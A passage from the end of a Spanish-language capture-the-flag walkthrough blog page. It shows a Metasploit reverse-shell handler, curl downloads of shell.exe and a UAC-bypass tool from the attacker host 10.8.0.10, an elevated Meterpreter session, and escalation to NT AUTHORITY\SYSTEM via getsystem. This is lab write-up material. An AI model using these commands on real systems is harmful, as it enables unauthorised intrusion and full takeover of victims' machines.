+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) >> use exploit/multi/handler
+</span><span class="az">[*] </span><span class="p">Using configured payload generic/shell_reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set payload windows/x64/meterpreter/reverse_tcp  
+payload => windows/x64/meterpreter/reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lhost tun0
+lhost => tun0
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lport 4444
+lport => 4444
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Descargamos los archivos y ejecutamos el <a href="https://github.com/Kudaes/Elevator">elevator</a> pasandole como comando a ejecutar el <code class="language-plaintext highlighter-rouge">shell.exe</code>, lo ejecutamos y esto deberia ejecutarse bypasseando <code class="language-plaintext highlighter-rouge">UAC</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.10/shell.exe </span><span class="c1">-o</span><span class="p"> shell.exe
+
+C:\ProgramData> </span><span class="am">curl</span><span class="p"> 10.8.0.10/elevator.exe</span><span class="c1"> -o</span><span class="p"> elevator.exe
+
+C:\ProgramData> </span><span class="am">elevator.exe </span><span class="az">"C:\ProgramData\shell.exe" </span><span class="c1">--new-console</span><span class="p">  
+[+] Unelevatad notepad.exe process created.
+[+] Reference to debug object retrieved.
+[+] Debug object successfully detached.
+[+] Elevated taskmgr.exe process created.
+[+] Initial process creation debug event obtained.
+[+] Full access handle obtained.
+[!] Elevated process spawned!
+
+C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando ejecuta el <code class="language-plaintext highlighter-rouge">shell.exe</code> bypasseando <code class="language-plaintext highlighter-rouge">UAC</code> recibimos una sesión nuevamente de <code class="language-plaintext highlighter-rouge">rainbow</code> pero ahora con privilegios totales sobre el sistema como administrador</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0</span><span class="az"> Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.8.0.10:4444
+</span><span class="az">[*] </span><span class="p">Sending stage (201798 bytes) to 10.10.122.10
+</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.8.0.10:4444 -> 10.10.122.10:49867)  
+
+(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\ProgramData) > getuid
+Server username: RAINBOW\rainbow
+(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\ProgramData) > getprivs
+
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeDelegateSessionUserImpersonatePrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\ProgramData) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Y aunque es totalmente innecesario en este punto, podemos usar <code class="language-plaintext highlighter-rouge">getsystem</code> para convertirnos en el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> que tiene máximos privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter</span><span class="az"> 1</span><span class="p">)(C:\ProgramData) > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).  
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\ProgramData) > getuid
+Server username: NT AUTHORITY\SYSTEM
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\ProgramData) ></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
